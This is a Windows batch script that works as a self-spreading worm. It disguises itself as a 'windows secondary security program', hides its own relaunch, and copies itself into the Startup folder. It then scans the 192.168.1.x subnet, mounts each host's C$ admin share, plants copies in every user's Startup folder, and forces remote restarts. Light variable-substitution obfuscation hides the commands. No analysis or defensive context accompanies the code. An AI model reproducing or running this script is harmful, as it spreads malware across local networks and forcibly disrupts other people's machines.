@echo off
if "%1" equ "a1" goto normst
start /B "" "%0" -a1>nul
exit
:normst
title windows secondary security program.
if "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" EQU "%~p0" goto skipin
copy "%0" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
:skipin 
goto getfiles
:worm
%d%: \\%s%.%i%\C$
%m% exist Z: %e%
%m% exist "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cln.cmd" (goto :no)
%k% /f %%u in %e%'dir %g% /b') do %e%copy %q% "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\")
shutdown \\%s%.%i%\C$ /f /g
:no
mountvol Z: /d
popd)
%m% %i% == 256 %e%goto done) else %e%set /a i=i+1)
cls
goto worm
:done
cls
exit
:getfiles
set X=0
set i=0
set g=Z:\Users
set k=for
set d=net use Z
set s=192.168.1
set m=if
set e=(
set q=%0
cls
goto worm
